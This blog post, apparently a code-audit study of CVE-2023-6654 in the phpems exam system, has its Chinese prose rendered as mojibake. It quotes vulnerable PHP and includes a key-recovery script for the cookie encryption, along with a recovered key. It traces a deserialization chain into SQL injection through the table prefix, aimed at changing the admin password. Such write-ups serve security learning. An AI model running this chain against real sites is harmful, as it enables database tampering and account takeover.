<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="phpems ä»£ç å®¡è®¡å­¦ä¹ " />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            phpems ä»£ç å®¡è®¡å­¦ä¹ 
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93SQL%E6%B3%A8%E5%85%A5"><span class="post-toc-text">ååºåˆ—åŒ–æ‰“SQLæ³¨å…¥</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="post-toc-text">æ¼æ´åˆ†æ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9"><span class="post-toc-text">ååºåˆ—åŒ–ç‚¹</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0%E7%A0%B4%E8%A7%A3"><span class="post-toc-text">åŠ å¯†å‡½æ•°ç ´è§£</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sqlæ³¨å…¥</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#RCE%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="post-toc-text">RCEï¼ˆä»£ç æ‰§è¡Œï¼‰</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="post-toc-text">æ¼æ´åˆ†æ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%87%E7%AD%BE%E7%B1%BB%E5%9E%8B%E4%B8%BA%E5%88%86%E7%B1%BB%E5%88%97%E8%A1%A8"><span class="post-toc-text">æ ‡ç­¾ç±»å‹ä¸ºåˆ†ç±»åˆ—è¡¨</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%87%E7%AD%BE%E7%B1%BB%E5%9E%8B%E4%B8%BASQL%E6%A8%A1%E5%BC%8F"><span class="post-toc-text">æ ‡ç­¾ç±»å‹ä¸ºSQLæ¨¡å¼</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%A0%87%E7%AD%BE%E7%B1%BB%E5%9E%8B%E4%B8%BA%E6%A8%A1%E6%9D%BF%E6%A8%A1%E5%BC%8F"><span class="post-toc-text">æ ‡ç­¾ç±»å‹ä¸ºæ¨¡æ¿æ¨¡å¼</span></a></li></ol></li></ol></li></ol>
            
        
        <blockquote>
<p>phpååºåˆ—åŒ–å¯¼è‡´çš„sqlæ³¨å…¥</p>
<p>è¥¿æ¹–è®ºå‰‘èµµæ€»å‡ºçš„é¢˜ï¼Œä»–æäº¤çš„CVE-2023-6654</p>
<p>å‚è€ƒæ–‡ç« :<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA">https://mp.weixin.qq.com/s/P7akQHPp4saCl16E0Kw4tA</a></p>
</blockquote>
<p>ååºåˆ—åŒ–å¯¼è‡´çš„sqlæ³¨å…¥æˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œå­¦ä¹ </p>
<p>è·¯ç”±åˆ†æå°±ä¸å†™äº†ï¼Œè‡ªå·±å»çœ‹ï¼Œç€é‡åœ¨ååºåˆ—åŒ–å’Œsqlæ³¨å…¥éƒ¨åˆ†</p>
<h1 id="ååºåˆ—åŒ–æ‰“SQLæ³¨å…¥"><a href="#ååºåˆ—åŒ–æ‰“SQLæ³¨å…¥" class="headerlink" title="ååºåˆ—åŒ–æ‰“SQLæ³¨å…¥"></a>ååºåˆ—åŒ–æ‰“SQLæ³¨å…¥</h1><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="ååºåˆ—åŒ–ç‚¹"><a href="#ååºåˆ—åŒ–ç‚¹" class="headerlink" title="ååºåˆ—åŒ–ç‚¹"></a>ååºåˆ—åŒ–ç‚¹</h3><p>é¦–å…ˆé€šè¿‡è°ƒè¯•ä¼šå‘ç°ï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šæ‰§è¡Œæ–°å»º<code>session</code>å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œä»–çš„<code>getSessionId()</code>æ–¹æ³•</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108558.png"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022108178.png" alt="image-20240202210853025"></p>
<pre><code class="php">public function getSessionId()
&#123;
    if(!$this-&gt;sessionid)
    &#123;
        $cookie = $this-&gt;strings-&gt;decode($this-&gt;ev-&gt;getCookie($this-&gt;sessionname));//currentuser
        if($cookie)
        &#123;
            $this-&gt;sessionid = $cookie[&#39;sessionid&#39;];
        &#125;
    &#125;
    if(!$this-&gt;sessionid)
    &#123;
        $this-&gt;_getOnlySessionid();
        $this-&gt;setSessionUser(array(&quot;sessionid&quot; =&gt; $this-&gt;sessionid,&#39;sessionip&#39; =&gt; $this-&gt;ev-&gt;getClientIp()));
    &#125;
    if(!$this-&gt;getSessionValue())
    &#123;
        $this-&gt;setSessionUser(array(&quot;sessionid&quot; =&gt; $this-&gt;sessionid,&#39;sessionip&#39; =&gt; $this-&gt;ev-&gt;getClientIp()));
    &#125;
    return $this-&gt;sessionid;
&#125;
</code></pre>
<p>åœ¨è¿™é‡Œä»–ä¼šè°ƒç”¨<code>strings::decode()</code></p>
<pre><code class="php">public function decode($info)
&#123;
    $key = CS;//é…ç½®æ–‡ä»¶çš„å¯†é’¥
    $info = urldecode($info);
    $kl = strlen($key);
    $il = strlen($info);
    for($i = 0; $i &lt; $il; $i++)
    &#123;
        $p = $i%$kl;
        $info[$i] = chr(ord($info[$i])-ord($key[$p]));
    &#125;
    $info = unserialize($info);
    return $info;
&#125;
</code></pre>
<p>è¿™é‡Œè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œï¼Œä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹</p>
<p>è¿™é‡Œä¼ å…¥çš„å€¼å°±æ˜¯<code>$this-&gt;ev-&gt;getCookie($this-&gt;sessionname)</code>è¿”å›çš„å€¼ï¼Œå–çš„æ˜¯cookieé‡Œ<code>exam_currentuse</code>çš„å€¼</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022111383.png" alt="image-20240202211151241"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022112220.png" alt="image-20240202211226130"></p>
<p>æ‰€ä»¥è¿™é‡Œçš„å€¼å°±æ˜¯å¯æ§çš„ã€‚ä»<code>decode()</code>å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå€¼æ˜¯ç»è¿‡åŠ å¯†çš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†éœ€è¦ååºåˆ—åŒ–çš„å€¼è¿›è¡ŒåŠ å¯†æ“ä½œï¼Œå†ä¼ è¿›<code>decode()</code>è¿›è¡Œååºåˆ—åŒ–</p>
<h3 id="åŠ å¯†å‡½æ•°ç ´è§£"><a href="#åŠ å¯†å‡½æ•°ç ´è§£" class="headerlink" title="åŠ å¯†å‡½æ•°ç ´è§£"></a>åŠ å¯†å‡½æ•°ç ´è§£</h3><p>è¿™é‡Œçš„CSçš„å€¼ä¸ºé…ç½®æ–‡ä»¶é‡Œå®šä¹‰ï¼Œä¸”æˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾æ–¹æ³•è·å¾—è¿™ä¸ªkey</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022117488.png" alt="image-20240202211714349"></p>
<p>å¯¹æ¯”åŠ å¯†å’Œè§£å¯†å‡½æ•°</p>
<pre><code class="php">public function encode($info)
&#123;
    $info = serialize($info);
    $key = CS;//é…ç½®æ–‡ä»¶çš„å¯†é’¥
    $kl = strlen($key);
    $il = strlen($info);
    for($i = 0; $i &lt; $il; $i++)
    &#123;
        $p = $i%$kl;
        $info[$i] = chr(ord($info[$i])+ord($key[$p]));
    &#125;
    return urlencode($info);
&#125;
</code></pre>
<pre><code class="php">public function decode($info)
&#123;
    $key = CS;//é…ç½®æ–‡ä»¶çš„å¯†é’¥
    $info = urldecode($info);
    $kl = strlen($key);
    $il = strlen($info);
    for($i = 0; $i &lt; $il; $i++)
    &#123;
        $p = $i%$kl;
        $info[$i] = chr(ord($info[$i])-ord($key[$p]));
    &#125;
    $info = unserialize($info);
    return $info;
&#125;
</code></pre>
<p><code>$key</code>çš„é•¿åº¦ä¸º32ï¼Œ<code>$p</code>çš„å€¼å°±æ˜¯<code>$i%$kl</code>ï¼Œå³å–æ¨¡æ“ä½œï¼Œé‚£ä¹ˆ<code>$p</code>çš„å€¼å°±ä¸º<code>0,1,2,xxx,xxx,xxx,31,0,1,2</code>ä¾æ¬¡å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éå†äº†32æ¬¡</p>
<p>åŠ è§£å¯†çš„å¤§è‡´æ¨¡å¼ä¸ºï¼š</p>
<p>å¯†æ–‡å­—ç¬¦çš„ascii <strong>&#x3D;</strong> æ˜æ–‡å­—ç¬¦çš„ascii <strong>+</strong> keyå­—ç¬¦çš„asciiï¼Œæ˜æ–‡å­—ç¬¦çš„ascii <strong>&#x3D;</strong> å¯†æ–‡å­—ç¬¦çš„ascii <strong>-</strong> keyå­—ç¬¦çš„ascii</p>
<p>å¯ä»¥æ¨å‡ºï¼škeyå­—ç¬¦çš„ascii <strong>&#x3D;</strong> å¯†æ–‡å­—ç¬¦çš„ascii <strong>-</strong> æ˜æ–‡å­—ç¬¦çš„ascii&#96;</p>
<p>æ‰€ä»¥åªè¦çŸ¥é“æ˜æ–‡å’Œå¯¹åº”çš„å¯†æ–‡ï¼Œå°±å¯ä»¥å¾—åˆ°keyï¼Œç°åœ¨å°±æ˜¯è¦æ‰¾åˆ°å¯æ§çš„å¯†æ–‡</p>
<p>å½“æˆ‘ä»¬ä¸ç©¿ä»»ä½•cookieè¿›è¡Œè®¿é—®çš„æ—¶å€™ï¼Œä»–ä¼šè°ƒç”¨è¿™é‡Œæ¥ç”Ÿæˆä¸€ä¸ªcookie</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022132502.png" alt="image-20240202213214365"></p>
<pre><code class="php">private function _getOnlySessionid()
&#123;
    $code = uniqid($this-&gt;ev-&gt;getClientIp().print_r($_SERVER,true).microtime()).rand(100000,999999);
    $this-&gt;sessionid = md5($code);
    if($this-&gt;getSessionValue($this-&gt;sessionid))
    &#123;
        $this-&gt;_getOnlySessionid();
    &#125;
&#125;
</code></pre>
<p>è¿™é‡Œæ˜¯å–md5å€¼ï¼Œæ‰€ä»¥è·Ÿæˆ‘ä»¬æ— å…³</p>
<p>å¾—çœ‹<code>$this-&gt;setSessionUser()</code>ï¼Œè·Ÿè¿›<code>$this-&gt;ev-&gt;getClientIp()</code>ï¼Œå¯ä»¥çŸ¥é“<code>$this-&gt;e[&#39;ip&#39;]</code>çš„å€¼æ˜¯å¯ä»¥é€šè¿‡ä¸¤ä¸ªheaderæ§åˆ¶çš„ï¼Œæ¯”å¦‚<code>Client-IP</code>å’Œ<code>X-Forwarded-For</code>ã€‚å¹¶å°†è¿”å›å€¼èµ‹å€¼ç»™<code>sessionip</code></p>
<pre><code class="php">public function getClientIp()
&#123;
    if(!isset($this-&gt;e[&#39;ip&#39;]))
    &#123;
        if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;))
            $ip = getenv(&quot;HTTP_CLIENT_IP&quot;);
        else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;))
            $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);
        else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;))
            $ip = getenv(&quot;REMOTE_ADDR&quot;);
        else if (isset($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_SERVER[&#39;REMOTE_ADDR&#39;] &amp;&amp; strcasecmp($_SERVER[&#39;REMOTE_ADDR&#39;], &quot;unknown&quot;))
            $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
        else
            $ip = &quot;unknown&quot;;
        $this-&gt;e[&#39;ip&#39;] = $ip;
    &#125;
    return $this-&gt;e[&#39;ip&#39;];
&#125;
</code></pre>
<p>ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œæ¥è®¾ç½®cookie</p>
<pre><code class="php">//è®¾ç½®ä¼šè¯ç”¨æˆ·ä¿¡æ¯
public function setSessionUser($args = NULL)
&#123;
    if(!$args)return false;
    else
    &#123;
        if(!$args[&#39;sessiontimelimit&#39;])$args[&#39;sessiontimelimit&#39;] = TIME;
        if(!$this-&gt;sessionid)$this-&gt;getSessionId();
        $args[&#39;sessionid&#39;] = $this-&gt;sessionid;
        $args[&#39;sessiontimelimit&#39;] = TIME;
        $data = array(&#39;session&#39;,array(array(&#39;AND&#39;,&quot;sessionid = :sessionid&quot;,&#39;sessionid&#39;,$this-&gt;sessionid)));
        $sql = $this-&gt;pdosql-&gt;makeDelete($data);
        $this-&gt;db-&gt;exec($sql);
        $data = array(&#39;session&#39;,$args);
        $sql = $this-&gt;pdosql-&gt;makeInsert($data);
        $this-&gt;db-&gt;exec($sql);
        $ck = array(&#39;sessionid&#39;=&gt;$this-&gt;sessionid,&#39;sessionuserid&#39;=&gt;$args[&#39;sessionuserid&#39;],&#39;sessionpassword&#39;=&gt;$args[&#39;sessionpassword&#39;],&#39;sessionip&#39;=&gt;$args[&#39;sessionip&#39;]);
        $this-&gt;ev-&gt;setCookie($this-&gt;sessionname,$this-&gt;strings-&gt;encode($args),3600*24);
        return true;
    &#125;
&#125;
</code></pre>
<p>æœ€ååœ¨<code>setCookie()</code>è¿›è¡Œæœ€ç»ˆçš„æ“ä½œï¼Œå°†åŠ å¯†åçš„å€¼èµ‹å€¼ç»™cookieé‡Œçš„<code>exam_currentuser</code></p>
<pre><code class="php">public function setCookie($name,$value,$time=3600)
&#123;
    if($time)$time = TIME + $time;
    else $time = 0;
    if(CDO)setCookie(CH.$name,$value,$time,CP,CDO,false,TRUE);
    else setCookie(CH.$name,$value,$time,CP,&#39;&#39;,false,TRUE);
&#125;
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022143734.png" alt="image-20240202214306583"></p>
<p>å½“æˆ‘ä»¬è®¾ç½®<code>Client-IP: 127.0.0.1</code>headerçš„æ—¶å€™ï¼Œå°±å¯ä»¥çœ‹åˆ°<code>sessionip</code>çš„å€¼ä¸º<code>127.0.0.1</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022145041.png" alt="image-20240202214547950"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022144488.png" alt="image-20240202214416346"></p>
<p>è¿™é‡Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å¯†æ–‡éƒ¨åˆ†äº†ï¼Œå…¶æ˜æ–‡çš„ä¸º</p>
<pre><code>a:3:&#123;s:9:&quot;sessionid&quot;;s:32:&quot;f5316b94fc79a4a0a1095f1b6b105e7d&quot;;s:9:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:16:&quot;sessiontimelimit&quot;;i:1706881593;&#125;
</code></pre>
<p>æ€»å…±131ä¸ªå­—ç¬¦ï¼Œå…¶å¯†æ–‡ä¹Ÿåº”è¯¥æ˜¯131ä¸ªå­—ç¬¦</p>
<p>ä¸ºäº†è·å–åˆ°32ä½çš„keyï¼Œæˆ‘ä»¬éœ€è¦è®©æˆ‘ä»¬å¯ä»¥æ§åˆ¶ã€é¢„æµ‹çš„å¯†æ–‡é•¿åº¦è‡³å°‘ä¸º32ã€‚</p>
<p>åœ¨è¿™é‡Œå¯ä»¥å–çš„èŒƒå›´ä¸º<code>&quot;;s:9:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:16:&quot;sessiontimelimit&quot;;i:</code>ï¼Œè¿™é‡Œçš„é•¿åº¦æ˜¯60</p>
<p>æœ€åä¸ºäº†è·å–å®Œæ•´çš„keyï¼Œè¦ä¹ˆæ˜¯æ‰¾åˆ°å¯ä»¥æ•´é™¤32çš„èµ·ç‚¹ï¼Œè¦ä¹ˆæ˜¯æ‰¾åˆ°é‡å¤å­—ç¬¦ä¸²ï¼Œè‡ªå·±å»é¦–å°¾æ‹¼æ¥ã€‚æˆ‘è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œé€‰æ‹©ç¬¬ä¸€ç§æ–¹æ³•ã€‚</p>
<pre><code class="php">substr($æ˜æ–‡,64,32)
//:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:
</code></pre>
<p>å…ˆå¸¦headerï¼Œä¸å¸¦cookieå»è®¿é—®ç›®æ ‡ç½‘ç«™è·å–å¯†æ–‡</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022200598.png" alt="image-20240202220008509"></p>
<p>ç„¶ååˆ©ç”¨å¯†æ–‡å’Œæˆ‘ä»¬è°ƒå¼å‡ºæ¥çš„æ˜æ–‡è·å–key</p>
<p>è§£å¯†è„šæœ¬</p>
<pre><code class="php">&lt;?php
$enc=&quot;%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2598np%2595%25C5m%2595k%259C%2596%25C8g%259Bf%25C9%259D%2593%25C6%2597jb%2597%2591%2560j%25C4o%25C5dh%2594a%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Dmk%2599%2594f%259D%25B0&quot;;
$enc_r=urldecode($enc);
$enc_r=urldecode($enc_r);
$enc_r=substr($enc_r,64,32);
function getkey($a,$b)
&#123;
    $key=&quot;&quot;;
    $info=$a;
    $kl = 32;
    $il = strlen($a);
    for($i = 0; $i &lt; $il; $i++)
    &#123;
        $p = $i%$kl;
        $key.= chr(ord($info[$i])-ord($b[$p]));
    &#125;
    print_r($key);
&#125;

getkey($enc_r,&#39;:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:1&#39;);
</code></pre>
<p>å¾—åˆ°keyä¸º<code>4b394f264dfcdc724a06b9b05c1e59ed</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022201239.png" alt="image-20240202220133099"></p>
<h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><p>ååºåˆ—åŒ–èƒ½æ‰“çš„ç‚¹åªæœ‰ä¸€ä¸ªï¼Œå› ä¸ºè¿™å¥—æºç æ²¡æœ‰ä½¿ç”¨è‡ªåŠ¨ç±»åŠ è½½</p>
<p>å°±æ˜¯<code>session</code>ç±»çš„<code>__destruct()</code>å‡½æ•°ï¼Œé€šè¿‡æ›´æ”¹<code>pdosql</code>å¯¹è±¡çš„å±æ€§ï¼Œè¿›è¡Œsqlæ³¨å…¥</p>
<pre><code>session::__destruct()-&gt;pdosql::makeUpdate()-&gt;pepdo::exec()
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022204419.png" alt="image-20240202220435313"></p>
<p>å…·ä½“æ›´æ”¹çš„åœ°æ–¹å°±æ˜¯<code>pdosql</code>å¯¹è±¡çš„<code>tablepre</code>å±æ€§</p>
<pre><code class="php">//ç”Ÿæˆupdate sql
public function makeUpdate($args,$tablepre = NULL)
&#123;
    if(!is_array($args))return false;
    if($tablepre === NULL)$tb_pre = $this-&gt;tablepre;
    else $tb_pre = $tablepre;
    $tables = $args[0];
    $args[1] = $this-&gt;_makeDefaultUpdateArgs($tables,$args[1]);
    if(is_array($tables))
    &#123;
        $db_tables = array();
        foreach($tables as $p)
        &#123;
            $db_tables[] = &quot;&#123;$tb_pre&#125;&#123;$p&#125; AS $p&quot;;
        &#125;
        $db_tables = implode(&#39;,&#39;,$db_tables);
    &#125;
    else
        $db_tables = $tb_pre.$tables;
    $v = array();

    $pars = $args[1];
    if(!is_array($pars))return false;
    $parsql = array();
    foreach($pars as $key =&gt; $value)
    &#123;
        $parsql[] = $key.&#39; = &#39;.&#39;:&#39;.$key;
        if(is_array($value))$value = serialize($value);
        $v[$key] = $value;
    &#125;
    $parsql = implode(&#39;,&#39;,$parsql);

    $query = $args[2];
    if(!is_array($query))$db_query = 1;
    else
    &#123;
        $q = array();
        foreach($query as $p)
        &#123;
            $q[] = $p[0].&#39; &#39;.$p[1].&#39; &#39;;
            if(isset($p[2]))
                $v[$p[2]] = $p[3];
        &#125;
        $db_query = &#39;1 &#39;.implode(&#39; &#39;,$q);
    &#125;
    if(isset($args[3]))
        $db_groups = is_array($args[3])?implode(&#39;,&#39;,$args[3]):$args[3];
    else
        $db_groups = &#39;&#39;;
    if(isset($args[4]))
        $db_orders = is_array($args[4])?implode(&#39;,&#39;,$args[4]):$args[4];
    else
        $db_orders = &#39;&#39;;
    if(isset($args[5]))
        $db_limits = is_array($args[5])?implode(&#39;,&#39;,$args[5]):$args[5];
    else
        $db_limits = &#39;&#39;;
    if($db_limits == false &amp;&amp; $db_limits !== false)$db_limits = $this-&gt;_mostlimits;
    $db_groups = $db_groups?&#39; GROUP BY &#39;.$db_groups:&#39;&#39;;
    $db_orders = $db_orders?&#39; ORDER BY &#39;.$db_orders:&#39;&#39;;
    $sql = &#39;UPDATE &#39;.$db_tables.&#39; SET &#39;.$parsql.&#39; WHERE &#39;.$db_query.$db_groups.$db_orders.&#39; LIMIT &#39;.$db_limits;
    return array(&#39;sql&#39; =&gt; $sql, &#39;v&#39; =&gt; $v);
&#125;
</code></pre>
<p>å–<code>$this-&gt;tablepre</code>çš„å€¼ï¼Œç„¶åæ‹¼æ¥ä¸º<code>$db_tables</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022210687.png" alt="image-20240202221040641"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022209373.png" alt="image-20240202220937285"></p>
<p>æœ€åæ‹¼æ¥ä¸ºsqlè¯­å¥</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202402022212027.png" alt="image-20240202221228984"></p>
<pre><code class="sql">UPDATE x2_session SET sessionlasttime = :sessionlasttime WHERE 1 AND sessionid = :sessionid  LIMIT 512
</code></pre>
<p>è¿™é‡Œé¢çš„<code>x2_</code>æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ sqlè¯­å¥æ¥ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æˆ–è€…ä¿®æ”¹ç”¨æˆ·çš„æƒé™ï¼Œç„¶ååˆ©ç”¨<code>#</code>æˆ–è€…<code>+ --qwe</code>æ¥æ³¨é‡Šåé¢çš„sqlè¯­å¥</p>
<p>é€šè¿‡æŸ¥çœ‹æ³¨å†Œä»£ç ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œçš„å¯†ç æ˜¯ç»è¿‡md5åŠ å¯†</p>
